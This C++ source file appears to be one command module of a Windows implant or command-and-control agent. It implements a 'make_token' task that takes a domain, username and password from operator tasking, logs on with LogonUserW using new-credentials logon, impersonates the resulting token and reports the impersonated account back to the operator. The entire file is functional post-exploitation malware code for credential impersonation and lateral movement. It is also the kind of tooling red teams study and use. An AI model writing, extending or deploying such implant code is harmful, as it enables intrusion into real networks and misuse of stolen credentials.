#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_MAKE_TOKEN

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_make_token(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t domain_len = 0;
    auto domain_str = parser_string( params, &domain_len );
    uint32_t user_len = 0;
    auto user_str = parser_string( params, &user_len );
    uint32_t pass_len = 0;
    auto pass_str = parser_string( params, &pass_len );

    if ( !user_str || user_len == 0 || !pass_str || pass_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "need username and password" ) ) );
        return;
    }

    char domain_buf[128] = { 0 };
    if ( domain_str && domain_len > 0 )
        memory::copy( domain_buf, domain_str, domain_len < 127 ? domain_len : 127 );
    else
        domain_buf[0] = '.';

    char user_buf[128] = { 0 };
    memory::copy( user_buf, user_str, user_len < 127 ? user_len : 127 );

    char pass_buf[256] = { 0 };
    memory::copy( pass_buf, pass_str, pass_len < 255 ? pass_len : 255 );

    wchar_t w_domain[128] = { 0 };
    wchar_t w_user[128] = { 0 };
    wchar_t w_pass[256] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, domain_buf, -1, w_domain, 128 );
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, user_buf, -1, w_user, 128 );
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, pass_buf, -1, w_pass, 256 );

    HANDLE h_token = nullptr;
    BOOL ok = inst.advapi32.LogonUserW(
        w_user, w_domain, w_pass,
        9,     // LOGON32_LOGON_NEW_CREDENTIALS
        0,     // LOGON32_PROVIDER_DEFAULT
        &h_token
    );

    // zero password from stack
    memory::zero( pass_buf, sizeof(pass_buf) );
    memory::zero( w_pass, sizeof(w_pass) );

    if ( !ok || !h_token ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LogonUserW failed" ) ) );
        return;
    }

    if ( !inst.advapi32.ImpersonateLoggedOnUser( h_token ) ) {
        inst.kernel32.CloseHandle( h_token );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "ImpersonateLoggedOnUser failed" ) ) );
        return;
    }

    // close old token if one exists
    if ( inst.agent.impersonated_token )
        inst.kernel32.CloseHandle( inst.agent.impersonated_token );

    inst.agent.impersonated_token = h_token;

    char msg[320] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "now impersonating " ) ) );
    str_concat( msg, domain_buf );
    str_concat( msg, symbol<char*>( const_cast<char*>( "\\" ) ) );
    str_concat( msg, user_buf );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
